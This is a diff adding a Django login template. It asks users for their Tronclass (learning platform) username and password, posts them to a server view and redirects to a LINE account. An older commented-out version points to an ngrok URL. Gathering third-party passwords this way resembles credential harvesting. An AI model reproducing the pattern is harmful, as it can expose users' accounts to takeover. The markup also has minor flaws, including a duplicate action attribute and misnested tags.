@@ -1,0 +1,29 @@
+<!-- <html>
+<div class='container'>  
+    <h1>請輸入帳號密碼</h1>     
+    帳號: <INPUT TYPE="text" NAME="account"><BR>
+    密碼: <input type="password" name="YourPassword"><BR>
+    <input TYPE="submit" onclick="javascript:location.href='https://0265956c3ebe.ngrok.io/done'" value="送出"></input>
+    </form>
+  </div>
+</html> -->
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>test</title>
+</head>
+<body>
+    <h1 style="text-align: center;">輸入Tronclass的帳號及密碼</h1>
+    <center><form method="post" action="{% url 'check' %}" action="https://line.me/R/ti/p/@433kwfqx">  
+        {% csrf_token %}
+        帳號: <INPUT TYPE="text" name="account" placeholder="你的帳號" style="text-align: center;"><BR>
+        密碼: <input type="password" name="YourPassword" placeholder="你的密碼" style="text-align: center;"><BR>
+        <input TYPE="submit" onclick="javascript:location.href='https://line.me/R/ti/p/@433kwfqx'" value="送出" style="text-align: center;"></input>
+    </center>
+        <P style="text-align: center;"> 送出後即可關閉此網頁</P>
+    </form>
+</body>
+</html>
